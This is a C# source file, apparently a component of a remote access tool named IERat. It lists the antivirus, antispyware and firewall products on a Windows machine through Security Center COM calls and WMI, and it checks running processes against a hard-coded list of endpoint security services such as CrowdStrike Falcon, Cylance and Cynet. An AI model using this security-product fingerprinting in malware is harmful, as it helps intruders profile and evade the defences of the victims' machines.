using System;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;

namespace IERat.lib
{
    class AVUtils
    {
        public enum HRESULT : int
        {
            S_OK = 0,
            S_FALSE = 1,
            E_NOINTERFACE = unchecked((int)0x80004002),
            E_NOTIMPL = unchecked((int)0x80004001),
            E_FAIL = unchecked((int)0x80004005)
        }

        public enum WSC_SECURITY_PRODUCT_STATE : int
        {
            WSC_SECURITY_PRODUCT_STATE_ON = 0,
            WSC_SECURITY_PRODUCT_STATE_OFF = 1,
            WSC_SECURITY_PRODUCT_STATE_SNOOZED = 2,
            WSC_SECURITY_PRODUCT_STATE_EXPIRED = 3
        }

        public enum WSC_SECURITY_SIGNATURE_STATUS : int
        {
            WSC_SECURITY_PRODUCT_OUT_OF_DATE = 0,
            WSC_SECURITY_PRODUCT_UP_TO_DATE = 1
        }
        public enum WSC_SECURITY_PROVIDER : int
        {
            // Represents the aggregation of all firewalls for this computer.
            WSC_SECURITY_PROVIDER_FIREWALL = 0x1,
            // Represents the Automatic updating settings for this computer.
            WSC_SECURITY_PROVIDER_AUTOUPDATE_SETTINGS = 0x2,
            // Represents the aggregation of all antivirus products for this comptuer.
            WSC_SECURITY_PROVIDER_ANTIVIRUS = 0x4,
            // Represents the aggregation of all antispyware products for this comptuer.
            WSC_SECURITY_PROVIDER_ANTISPYWARE = 0x8,
            // Represents the settings that restrict the access of web sites in each of the internet zones.
            WSC_SECURITY_PROVIDER_INTERNET_SETTINGS = 0x10,
            // Represents the User Account Control settings on this machine.
            WSC_SECURITY_PROVIDER_USER_ACCOUNT_CONTROL = 0x20,
            // Represents the running state of the Security Center service on this machine.
            WSC_SECURITY_PROVIDER_SERVICE = 0x40,

            WSC_SECURITY_PROVIDER_NONE = 0,

            // Aggregates all of the items that Security Center monitors.
            WSC_SECURITY_PROVIDER_ALL = WSC_SECURITY_PROVIDER_FIREWALL |
                                                                    WSC_SECURITY_PROVIDER_AUTOUPDATE_SETTINGS |
                                                                    WSC_SECURITY_PROVIDER_ANTIVIRUS |
                                                                    WSC_SECURITY_PROVIDER_ANTISPYWARE |
                                                                    WSC_SECURITY_PROVIDER_INTERNET_SETTINGS |
                                                                    WSC_SECURITY_PROVIDER_USER_ACCOUNT_CONTROL |
                                                                    WSC_SECURITY_PROVIDER_SERVICE
        }

        [ComImport]
        [Guid("8C38232E-3A45-4A27-92B0-1A16A975F669")]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        public interface IWscProduct
        {
            #region <IDispatch>
            int GetTypeInfoCount();
            [return: MarshalAs(UnmanagedType.Interface)]
            IntPtr GetTypeInfo([In, MarshalAs(UnmanagedType.U4)] int iTInfo, [In, MarshalAs(UnmanagedType.U4)] int lcid);
            [PreserveSig]
            HRESULT GetIDsOfNames([In] ref Guid riid, [In, MarshalAs(UnmanagedType.LPArray)] string[] rgszNames, [In, MarshalAs(UnmanagedType.U4)] int cNames,
                [In, MarshalAs(UnmanagedType.U4)] int lcid, [Out, MarshalAs(UnmanagedType.LPArray)] int[] rgDispId);
            [PreserveSig]
            HRESULT Invoke(int dispIdMember, [In] ref Guid riid, [In, MarshalAs(UnmanagedType.U4)] int lcid, [In, MarshalAs(UnmanagedType.U4)] int dwFlags,
                [Out, In] DISPPARAMS pDispParams, [Out] out object pVarResult, [Out, In] EXCEPINFO pExcepInfo, [Out, MarshalAs(UnmanagedType.LPArray)] IntPtr[] pArgErr);
            #endregion

            HRESULT get_ProductName(out string pVal);
            HRESULT get_ProductState(out WSC_SECURITY_PRODUCT_STATE pVal);
            HRESULT get_SignatureStatus(out WSC_SECURITY_SIGNATURE_STATUS pVal);
            HRESULT get_RemediationPath(out string pVal);
            HRESULT get_ProductStateTimestamp(out string pVal);
        }

        [ComImport]
        [Guid("722A338C-6E8E-4E72-AC27-1417FB0C81C2")]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        public interface IWSCProductList
        {
            #region <IDispatch>
            int GetTypeInfoCount();
            [return: MarshalAs(UnmanagedType.Interface)]
            IntPtr GetTypeInfo([In, MarshalAs(UnmanagedType.U4)] int iTInfo, [In, MarshalAs(UnmanagedType.U4)] int lcid);
            [PreserveSig]
            HRESULT GetIDsOfNames([In] ref Guid riid, [In, MarshalAs(UnmanagedType.LPArray)] string[] rgszNames, [In, MarshalAs(UnmanagedType.U4)] int cNames,
                [In, MarshalAs(UnmanagedType.U4)] int lcid, [Out, MarshalAs(UnmanagedType.LPArray)] int[] rgDispId);
            [PreserveSig]
            HRESULT Invoke(int dispIdMember, [In] ref Guid riid, [In, MarshalAs(UnmanagedType.U4)] int lcid, [In, MarshalAs(UnmanagedType.U4)] int dwFlags,
                [Out, In] DISPPARAMS pDispParams, [Out] out object pVarResult, [Out, In] EXCEPINFO pExcepInfo, [Out, MarshalAs(UnmanagedType.LPArray)] IntPtr[] pArgErr);
            #endregion

            HRESULT Initialize(uint provider);
            HRESULT get_Count(out uint pVal);
            HRESULT get_Item(uint index, out IWscProduct pVal);
        }
        public static String GetAV()
        {
            string test = "";
            try
            {
                Guid CLSID_WSCProductList = new Guid("17072F7B-9ABE-4A74-A261-1EB76B55107A");
                Type WSCProductListType = Type.GetTypeFromCLSID(CLSID_WSCProductList, true);
                WSC_SECURITY_PROVIDER[] arrayProviders = { WSC_SECURITY_PROVIDER.WSC_SECURITY_PROVIDER_ANTIVIRUS, WSC_SECURITY_PROVIDER.WSC_SECURITY_PROVIDER_ANTISPYWARE, WSC_SECURITY_PROVIDER.WSC_SECURITY_PROVIDER_FIREWALL };

                foreach (uint nProvider in arrayProviders)
                {
                    object WSCProductList = Activator.CreateInstance(WSCProductListType);
                    IWSCProductList pWSCProductList = (IWSCProductList)WSCProductList;
                    HRESULT hr = pWSCProductList.Initialize(nProvider);
                    if (hr == HRESULT.S_OK)
                    {
                        uint nProductCount = 0;
                        hr = pWSCProductList.get_Count(out nProductCount);
                        if (hr == HRESULT.S_OK)
                        {
                            if (nProvider == (uint)WSC_SECURITY_PROVIDER.WSC_SECURITY_PROVIDER_ANTIVIRUS)
                            {
                                //Console.WriteLine("\n\nAntivirus Products:\n");
                                for (uint i = 0; i < nProductCount; i++)
                                {
                                    IWscProduct pWscProduct;
                                    hr = pWSCProductList.get_Item(i, out pWscProduct);
                                    if (hr == HRESULT.S_OK)
                                    {
                                        string sProductName = new string('\0', 260);
                                        hr = pWscProduct.get_ProductName(out sProductName);
                                        if (hr == HRESULT.S_OK)
                                        {
                                            if (test == "") test += sProductName;
                                            else
                                            {
                                                if (!sProductName.Contains("Defender"))
                                                {
                                                    test = test + " + " + sProductName;
                                                }
                                            }
                                        }
                                    }
                                }
                            }

                        }
                    }
                }

                string n2 = "";
                Process[] running_process_list3 = Process.GetProcesses();
                string[] selected_process_list3 = new string[]
                {
                "CynetEPS", "CylanceSvc"
                 };


                foreach (Process process in running_process_list3)
                    if (selected_process_list3.Contains(process.ProcessName))
                    {
                        n2 = process.ProcessName;
                        break;
                    }

                if (n2 != "")
                {
                    switch (n2)
                    {
                        case "CylanceSvc":
                            test = test + " + " + "Cylance";
                            break;
                        case "CSFalconService":
                            test = test + " + " + "CrowdStrike Falcon";
                            break;
                        case "CynetEPS":
                            test = test + " + " + "Cynet";
                            break;
                    }
                }
                if ((test.Contains('+')) && test.Contains("Windows Defender Antivirus"))  {
                    test = test.Replace("Windows Defender Antivirus", "").Replace("+", "").Replace(" ", "");
                }
                return test;
            }
            catch
            {
                string r = "";
                Process[] running_process_list2 = Process.GetProcesses();
                string[] selected_process_list2 = new string[]
                {
                "CylanceSvc",
                "CSFalconService", "CynetEPS"
                 };

                foreach (Process process in running_process_list2)
                {
                    if (selected_process_list2.Contains(process.ProcessName))
                    {
                        r = process.ProcessName;
                        break;
                    }
                }

                if (r != "")
                {
                    switch (r)
                    {
                        case "CylanceSvc":
                            r = "Cylance";
                            break;
                        case "CSFalconService":
                            r = "CrowdStrike Falcon";
                            break;
                        case "CynetEPS":
                            r = "Cynet";
                            break;
                    }
                }

                else
                {
                    string os = Utils.GetOS();
                    ManagementObjectSearcher wmiData;

                    if (!((os.Contains("Server 2012")) || (os.Contains("Server 2008") || (os.Contains("Windows 7")))))
                    {
                        wmiData = new ManagementObjectSearcher(@"root\SecurityCenter2", "SELECT * FROM AntiVirusProduct");
                        ManagementObjectCollection data = wmiData.Get();
                        ManagementObject[] arr = new ManagementObject[data.Count];
                        data.CopyTo(arr, 0);
                        ManagementObject av_item = arr[arr.Length - 1];
                        r = (String)av_item["displayName"];
                    }
                    else   { r = "N/A";    }
                }
                return r;
            }
        }
    }
}
